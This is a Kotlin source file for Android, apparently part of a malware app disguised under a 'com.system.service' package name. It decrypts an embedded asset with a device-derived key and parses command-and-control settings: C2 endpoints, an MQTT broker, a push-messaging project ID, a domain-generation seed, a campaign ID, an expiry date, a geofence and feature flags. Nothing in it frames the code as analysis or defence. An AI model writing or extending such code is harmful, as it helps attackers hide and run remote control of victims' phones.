// [context: Kotlin, Android API 26+, decrypt and parse embedded C2 config]
package com.system.service.core

import android.content.Context
import com.system.service.crypto.KeyDerivation
import com.system.service.crypto.SessionCrypto
import org.json.JSONObject

data class AppConfig(
    val c2Endpoints: List<String>,
    val fcmProjectId: String,
    val mqttBroker: String,
    val dgaSeed: ByteArray,
    val campaignId: String,
    val expiryDate: Long,
    val geoFence: List<String>,
    val features: Set<String>
)

class ConfigManager private constructor(private val context: Context) {

    var config: AppConfig? = null
        private set

    fun load(): Boolean {
        try {
            val encrypted = context.assets.open("config_encrypted.bin").readBytes()
            val deviceKey = KeyDerivation.deriveDeviceKey()
            val decrypted = SessionCrypto.decrypt(encrypted, deviceKey) ?: return false
            val json = JSONObject(String(decrypted))
            config = AppConfig(
                c2Endpoints = json.getJSONArray("c2Endpoints").let { arr ->
                    (0 until arr.length()).map { arr.getString(it) }
                },
                fcmProjectId = json.optString("fcmProjectId"),
                mqttBroker = json.optString("mqttBroker"),
                dgaSeed = android.util.Base64.decode(json.optString("dgaSeed"), android.util.Base64.DEFAULT),
                campaignId = json.optString("campaignId"),
                expiryDate = json.optLong("expiryDate", Long.MAX_VALUE),
                geoFence = json.optJSONArray("geoFence")?.let { arr ->
                    (0 until arr.length()).map { arr.getString(it) }
                } ?: emptyList(),
                features = json.optJSONArray("features")?.let { arr ->
                    (0 until arr.length()).map { arr.getString(it) }.toSet()
                } ?: emptySet()
            )
            return true
        } catch (e: Exception) {
            return false
        }
    }

    fun reload() { load() }

    fun isExpired(): Boolean = config?.let {
        System.currentTimeMillis() > it.expiryDate
    } ?: false

    companion object {
        @Volatile private var instance: ConfigManager? = null
        fun getInstance(context: Context): ConfigManager =
            instance ?: synchronized(this) {
                instance ?: ConfigManager(context.applicationContext).also {
                    instance = it
                    it.load()
                }
            }
    }
}
